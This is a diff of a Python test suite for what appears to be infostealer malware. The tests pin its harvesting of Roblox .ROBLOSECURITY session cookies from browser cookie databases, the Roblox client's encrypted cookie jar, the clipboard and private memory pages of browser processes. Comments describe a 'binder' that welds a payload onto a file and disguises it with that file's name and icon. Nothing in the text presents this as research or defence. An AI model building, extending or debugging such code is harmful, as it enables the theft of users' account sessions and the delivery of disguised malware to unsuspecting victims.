@@ -1127,9 +1127,9 @@ def test_roblox_harvest_needs_the_prefix_not_just_the_name() -> None:
 def test_roblox_writes_one_line_per_distinct_value(
     monkeypatch: pytest.MonkeyPatch, tmp_path: Path
 ) -> None:
-    # The same cookie is normally in the store and in memory. Two copies of one session
-    # are one finding, and the memory phase is skipped once the store has answered
-    # because it is the slow half.
+    # The same cookie is normally in the store, in the client jar and in memory. Three
+    # copies of one session are one finding, and every carrier is read on every run
+    # because two signed-in accounts can sit in different ones.
     from agent.sources import roblox
 
     token = roblox_token(b"ONCE")
@@ -1139,7 +1139,11 @@ def test_roblox_writes_one_line_per_distinct_value(
     monkeypatch.setattr(
         roblox, "_gecko_tokens", lambda: ([token], {"profiles": 1, "found": 1, "reason": ""})
     )
-    monkeypatch.setattr(roblox, "_memory_tokens", lambda: ([], {"reason": "stubbed"}))
+    monkeypatch.setattr(
+        roblox, "_client_tokens", lambda: ([token], {"jars": 1, "found": 1, "reason": ""})
+    )
+    monkeypatch.setattr(roblox, "_clipboard_tokens", lambda: ([], {"reason": "stubbed"}))
+    monkeypatch.setattr(roblox, "_memory_tokens", lambda: ([token], {"reason": ""}))
 
     out = tmp_path / "out"
     out.mkdir()
@@ -1150,18 +1154,28 @@ def test_roblox_writes_one_line_per_distinct_value(
 
     status = json.loads((out / roblox.STATUS_FILE).read_text(encoding="utf-8"))
     assert status["found"] == 1
-    assert status["methods"]["memory"]["reason"] == "skipped, store answered"
+    assert status["methods"]["memory"]["reason"] == ""
 
 
 def test_roblox_with_no_session_says_which_methods_found_nothing(
     monkeypatch: pytest.MonkeyPatch, tmp_path: Path
 ) -> None:
     # A machine with no Roblox session must be distinguishable from a reader that broke,
-    # so the zero case still writes a status file naming all three methods.
-    from agent.sources import browsers, roblox
+    # so the zero case still writes a status file naming every method.
+    from agent.sources import roblox
 
-    monkeypatch.setattr(browsers, "chromium_roots", lambda: ())
-    monkeypatch.setattr(browsers, "gecko_roots", lambda: ())
+    monkeypatch.setattr(
+        roblox, "_chromium_tokens", lambda: ([], {"profiles": 0, "found": 0,
+                                                  "reason": "no .ROBLOSECURITY row"})
+    )
+    monkeypatch.setattr(
+        roblox, "_gecko_tokens", lambda: ([], {"profiles": 0, "found": 0,
+                                               "reason": "no .ROBLOSECURITY row"})
+    )
+    monkeypatch.setattr(
+        roblox, "_client_tokens", lambda: ([], {"jars": 1, "found": 0, "reason": "no_client"})
+    )
+    monkeypatch.setattr(roblox, "_clipboard_tokens", lambda: ([], {"reason": "no_client"}))
     monkeypatch.setattr(
         roblox,
         "_memory_tokens",
@@ -1180,6 +1194,246 @@ def test_roblox_with_no_session_says_which_methods_found_nothing(
     assert status["reason"] == "no session cookie on this machine"
     assert status["methods"]["memory"]["reason"] == "stubbed"
     assert status["methods"]["chromium"]["reason"] == "no .ROBLOSECURITY row"
+    assert status["methods"]["client"]["reason"] == "no_client"
+    assert status["methods"]["clipboard"]["reason"] == "no_client"
+
+
+def test_roblox_reads_the_client_jar_written_with_space_separators() -> None:
+    # The Roblox client writes its cookie file with a single space between records instead
+    # of a newline and terminates each value with ';'. A newline-only reader sees one row
+    # whose value carries the next record's domain and rejects it as a bad shape.
+    from agent.sources import roblox
+
+    token = roblox_token(b"JAR")
+    text = (
+        f"#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\t.ROBLOSECURITY\t{token}; "
+        f"#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193; "
+        f"#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tRBXEventTrackerV2\tCreateDate=1"
+    )
+
+    rows = roblox._netscape_rows(text)
+
+    assert [row["name"] for row in rows] == [
+        ".ROBLOSECURITY",
+        "GuestData",
+        "RBXEventTrackerV2",
+    ]
+    assert rows[0]["value"] == token
+    assert rows[0]["value"].endswith(";") is False
+    assert all(row["domain"] == ".roblox.com" for row in rows)
+
+
+def test_roblox_jar_reader_says_why_it_could_not_decode(tmp_path: Path) -> None:
+    # Every decode failure is a named reason, so a zero on a machine with a client is not
+    # the same finding as a zero on a machine without one.
+    from agent.sources import roblox
+
+    missing = tmp_path / "absent.dat"
+    assert roblox._jar_rows(missing)[1] == "no_client"
+
+    garbage = tmp_path / "garbage.dat"
+    garbage.write_text("not json at all", encoding="utf-8")
+    assert roblox._jar_rows(garbage)[1] == "decode_failed"
+
+    no_field = tmp_path / "nofield.dat"
+    no_field.write_text('{"CookiesVersion": "1"}', encoding="utf-8")
+    assert roblox._jar_rows(no_field)[1] == "decode_failed"
+
+    bad_b64 = tmp_path / "badb64.dat"
+    bad_b64.write_text(
+        json.dumps({"CookiesVersion": "1", "CookiesData": "AAAA"}), encoding="utf-8"
+    )
+    rows, reason, _detail = roblox._jar_rows(bad_b64)
+    assert rows == [] or reason in ("decode_failed", "dpapi_failed")
+
+
+def _stub_jar(
+    monkeypatch: pytest.MonkeyPatch,
+    tmp_path: Path,
+    plain: bytes,
+    rows: list[dict[str, str]],
+    reason: str = "",
+    detail: str = "",
+) -> None:
+    """Point the client reader at a fixed jar answer without sealing one on disk."""
+    from agent.sources import roblox
+
+    jar = tmp_path / "Roblox" / "LocalStorage" / "RobloxCookies.dat"
+    jar.parent.mkdir(parents=True, exist_ok=True)
+    jar.write_text("{}", encoding="utf-8")
+    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path))
+    monkeypatch.setattr(roblox, "_jar_open", lambda path: (plain, rows, reason, detail))
+
+
+def test_roblox_jar_names_an_empty_session_row_instead_of_the_tracker(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # The live laptop jar held exactly this: a tracker record first with a 78-byte
+    # CreateDate value, then a .ROBLOSECURITY row with nothing after the tab. The old
+    # reader blamed the tracker's shape, which sends the reader looking at the parser
+    # when the finding is that the client had no session in the jar at all.
+    from agent.sources import roblox
+
+    token = roblox_token(b"EMPTY")
+    plain = (
+        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tRBXEventTrackerV2\t"
+        "CreateDate=11/17/2026 18:36:44&rbxuid=10664732490&browserid=17935&rid=12345678; "
+        "#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t"
+    )
+    rows = roblox._netscape_rows(plain)
+    assert [row["name"] for row in rows] == ["RBXEventTrackerV2", ".ROBLOSECURITY"]
+    assert rows[-1]["value"] == ""
+    _stub_jar(monkeypatch, tmp_path, plain.encode(), rows)
+
+    tokens, detail = roblox._client_tokens()
+    record = detail["records"][0]
+
+    assert tokens == []
+    assert record["named"] == 1
+    assert record["prefixes"]["tracker"] == 1
+    assert record["reason"] == "truncated"
+    assert token not in record["detail"]
+
+
+def test_roblox_jar_says_tracker_only_when_that_is_all_it_holds(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    from agent.sources import roblox
+
+    plain = (
+        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-919370561; "
+        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tRBXEventTrackerV2\tCreateDate=1"
+    )
+    rows = roblox._netscape_rows(plain)
+    _stub_jar(monkeypatch, tmp_path, plain.encode(), rows)
+
+    tokens, detail = roblox._client_tokens()
+
+    assert tokens == []
+    assert detail["records"][0]["reason"] == "tracker_only"
+
+
+def test_roblox_jar_harvests_a_container_it_does_not_recognise(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # The client changed its container once already. When it changes again the row reader
+    # has nothing to chew on and the value is still in the decrypted bytes: the harvest
+    # pass is what makes that a read instead of a shape failure.
+    from agent.sources import roblox
+
+    token = roblox_token(b"WRAP")
+    plain = json.dumps({"Store": "LocalStorage", "CookieHeader": f".ROBLOSECURITY={token}"})
+    _stub_jar(
+        monkeypatch,
+        tmp_path,
+        plain.encode("utf-8"),
+        [],
+        "wrapper_unknown",
+        "41 bytes of json plaintext, no cookie row",
+    )
+
+    tokens, detail = roblox._client_tokens()
+    record = detail["records"][0]
+
+    assert tokens == [token]
+    assert record["reason"] == "ok"
+    assert record["harvest"] == 1
+
+
+def test_roblox_jar_reads_every_separator_the_client_writes() -> None:
+    # Semicolon with no space, and a bare domain record without the httponly prefix. Both
+    # spellings leave the value whole; a reader that misses them reports a bad shape on a
+    # row that was never split.
+    from agent.sources import roblox
+
+    token = roblox_token(b"SEP")
+    tight = (
+        f"#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t{token};"
+        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193"
+    )
+    bare = (
+        f"#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t{token};"
+        ".roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193"
+    )
+
+    for text in (tight, bare):
+        rows = roblox._netscape_rows(text)
+        assert [row["name"] for row in rows] == [".ROBLOSECURITY", "GuestData"]
+        assert rows[0]["value"] == token
+
+
+def test_roblox_jar_decodes_utf16_plaintext() -> None:
+    # A jar written as UTF-16 reads as NUL-separated text when decoded as UTF-8, and every
+    # field then fails a shape check for a reason that names the wrong thing.
+    from agent.sources import roblox
+
+    token = roblox_token(b"UTF16")
+    text = (
+        f"#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t{token}; "
+        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193"
+    )
+
+    rows = roblox._netscape_rows(roblox._jar_text(text.encode("utf-16")))
+
+    assert rows[0]["name"] == ".ROBLOSECURITY"
+    assert rows[0]["value"] == token
+
+
+def test_roblox_clipboard_yields_a_session_without_a_store(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    # "Copy as PowerShell" in DevTools puts the Cookie header on the clipboard, which is a
+    # real second copy of the value when every browser store refuses an open.
+    from agent import winapi
+    from agent.sources import roblox
+
+    token = roblox_token(b"CLIP")
+    pasted = (
+        "Invoke-WebRequest -Uri https://www.roblox.com/users/1/profile "
+        "-Headers @{'Cookie'='.ROBLOSECURITY=" + token + "'}"
+    )
+    monkeypatch.setattr(winapi, "clipboard_text", lambda: pasted)
+
+    tokens, detail = roblox._clipboard_tokens()
+
+    assert tokens == [token]
+    assert detail["found"] == 1
+    assert detail["read"] == len(pasted)
+
+
+def test_roblox_clipboard_says_nothing_when_it_is_empty(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    from agent import winapi
+    from agent.sources import roblox
+
+    monkeypatch.setattr(winapi, "clipboard_text", lambda: None)
+
+    tokens, detail = roblox._clipboard_tokens()
+
+    assert tokens == []
+    assert detail["read"] == 0
+    assert "empty" in detail["reason"]
+
+
+def test_roblox_memory_reads_private_pages_only() -> None:
+    # Image and mapped sections are the browser's own code and files on disk. Reading them
+    # cost 12-16 s per process and found nothing inside the budget; private-only finds the
+    # same cookie in about eleven seconds for the whole set.
+    from agent import winapi
+    from agent.sources import roblox
+
+    assert callable(winapi.RemoteProcess.regions_with_type)
+    assert roblox._MEM_PRIVATE == 0x00020000
+
+
+def test_roblox_reasons_cover_the_client_and_clipboard_outcomes() -> None:
+    from agent.sources import roblox
+
+    for reason in ("no_client", "dpapi_failed", "decode_failed"):
+        assert reason in roblox.REASONS
+    for reason in ("wrapper_unknown", "truncated", "tracker_only"):
+        assert reason in roblox.REASONS
 
 
 def test_sessions_writes_the_bare_token_beside_the_record(
@@ -1554,7 +1808,7 @@ def test_a_bound_file_that_is_not_there_blocks(tmp_path: Path) -> None:
 #
 # The binder has two jobs beyond welding a payload on: the file has to carry the icon
 # it was given, and it has to arrive called what the operator called the file it is
-# carrying. Both were wrong in V1, and both are pinned here.
+# carrying. Both were wrong in the current build, and both are pinned here.
 
 
 def test_the_artifact_is_named_after_the_bound_file(tmp_path: Path) -> None:
@@ -1837,3 +2091,181 @@ def test_every_payload_import_reaches_the_frozen_bundle() -> None:
     assert missing == set()
     # The one that was missing in the guest, named so the failure is legible.
     assert "uuid" in covered
+
+
+# --- ASCII purity -------------------------------------------------------------
+# The archive is read by tools that assume plain ASCII: a parser, a shell, a paste into
+# someone else's console. A vendor display name or an emoticon in a caption is not worth
+# a mojibake column in the one document that has to survive transport.
+
+_EMOJI_RANGES = (
+    (0x1F000, 0x1FAFF),
+    (0x2600, 0x27BF),
+    (0xFE0F, 0xFE0F),
+    (0x1F1E6, 0x1F1FF),
+)
+_SEPARATORS = (0x00B7, 0x2022)
+
+
+def test_no_emoji_or_middot_survives_in_the_shipped_source() -> None:
+    offenders: list[str] = []
+    for package in ("agent", "core", "app", "tools"):
+        base = ROOT / package
+        if not base.is_dir():
+            continue
+        for path in sorted(base.rglob("*.py")):
+            if "__pycache__" in path.parts:
+                continue
+            text = path.read_text(encoding="utf-8", errors="replace")
+            for number, line in enumerate(text.splitlines(), 1):
+                for char in line:
+                    point = ord(char)
+                    banned = any(low <= point <= high for low, high in _EMOJI_RANGES)
+                    if banned or point in _SEPARATORS:
+                        offenders.append(
+                            f"{path.relative_to(ROOT).as_posix()}:{number}: U+{point:04X}"
+                        )
+                        break
+    assert offenders == []
+
+
+def test_json_output_escapes_every_non_ascii_byte(tmp_path: Path) -> None:
+    from agent import util
+
+    target = tmp_path / "identity.json"
+    payload = {"name": "caf\u00e9", "global": "\U0001f600", "plain": "bench"}
+
+    assert util.write_json(target, payload)
+    raw = target.read_bytes()
+    assert all(byte < 128 for byte in raw)
+    assert json.loads(raw.decode("ascii")) == payload
+
+
+# --- the Roblox store read ----------------------------------------------------
+# The defect these pin: the store read used to take the newest N rows of the cookie
+# table and filter by name afterwards, so a session older than the newest N was
+# invisible and the status file said "no row" about a row that was there.
+
+
+def chromium_cookie_store(profile: Path, rows: list[tuple[str, str, str, bytes, int]]) -> None:
+    (profile / "Network").mkdir(parents=True, exist_ok=True)
+    (profile / "Preferences").write_text("{}", encoding="utf-8")
+    store = sqlite3.connect(str(profile / "Network" / "Cookies"))
+    store.execute(
+        "CREATE TABLE cookies (host_key TEXT, name TEXT, value TEXT, "
+        "encrypted_value BLOB, last_access_utc INTEGER)"
+    )
+    store.executemany(
+        "INSERT INTO cookies VALUES (?,?,?,?,?)",
+        rows,
+    )
+    store.commit()
+    store.close()
+
+
+def test_roblox_reads_the_domain_not_the_newest_rows(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    from agent.sources import browsers, roblox
+
+    user_data = tmp_path / "User Data"
+    profile = user_data / "Default"
+    token = roblox_token(b"OLD")
+
+    rows: list[tuple[str, str, str, bytes, int]] = [
+        (".example.com", f"sid{index}", "x", b"", 2_000_000_000 + index)
+        for index in range(300)
+    ]
+    # Older than every row above, which is exactly the case a recency cap loses.
+    rows.append((".roblox.com", ".ROBLOSECURITY", token, b"", 1_000_000_000))
+    chromium_cookie_store(profile, rows)
+
+    monkeypatch.setattr(
+        browsers, "chromium_roots", lambda: (browsers.Root("brave", user_data, False),)
+    )
+    monkeypatch.setattr(roblox.browsers, "gecko_roots", lambda: ())
+
+    tokens, detail = roblox._chromium_tokens()
+    assert tokens == [token]
+
+    record = detail["records"][0]
+    assert record["profile"] == "brave/Default"
+    assert record["rows"] == 1
+    assert record["named"] == 1
+    assert record["found"] == 1
+    assert record["reason"] == "ok"
+    assert record["prefixes"] == {"plain": 1}
+
+
+def test_roblox_reports_a_v20_row_it_could_not_open(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    from agent.sources import browsers, roblox
+
+    user_data = tmp_path / "User Data"
+    profile = user_data / "Default"
+    chromium_cookie_store(
+        profile,
+        [(".roblox.com", ".ROBLOSECURITY", "", b"v20" + b"\x00" * 64, 2_000_000_000)],
+    )
+
+    monkeypatch.setattr(
+        browsers, "chromium_roots", lambda: (browsers.Root("chrome", user_data, False),)
+    )
+
+    tokens, detail = roblox._chromium_tokens()
+    assert tokens == []
+
+    record = detail["records"][0]
+    assert record["named"] == 1
+    assert record["prefixes"] == {"v20": 1}
+    assert record["found"] == 0
+    assert record["reason"] == "key_missing"
+    assert record["detail"].startswith("v20 row")
+    assert detail["reasons"] == {"key_missing": 1}
+    assert detail["reason"] == "key_missing"
+
+
+def test_roblox_accepts_a_name_without_the_leading_dot(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    from agent.sources import browsers, roblox
+
+    user_data = tmp_path / "User Data"
+    profile = user_data / "Default"
+    token = "0123456789abcdefghijklmnopqrstuvwxyz" * 3
+    chromium_cookie_store(
+        profile,
+        [(".roblox.com", "ROBLOSECURITY", token, b"", 2_000_000_000)],
+    )
+
+    monkeypatch.setattr(
+        browsers, "chromium_roots", lambda: (browsers.Root("edge", user_data, False),)
+    )
+
+    tokens, detail = roblox._chromium_tokens()
+    assert tokens == [token]
+    assert detail["records"][0]["reason"] == "ok"
+
+
+def test_roblox_ignores_the_tracker_cookie(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    from agent.sources import browsers, roblox
+
+    user_data = tmp_path / "User Data"
+    profile = user_data / "Default"
+    tracker = "RBXSessionTracker" + "a1b2c3d4" * 20
+    chromium_cookie_store(
+        profile,
+        [(".roblox.com", "RBXSessionTracker", tracker, b"", 2_000_000_000)],
+    )
+
+    monkeypatch.setattr(
+        browsers, "chromium_roots", lambda: (browsers.Root("brave", user_data, False),)
+    )
+
+    tokens, detail = roblox._chromium_tokens()
+    assert tokens == []
+    assert detail["records"][0]["named"] == 0
+    assert detail["records"][0]["reason"] == "empty"
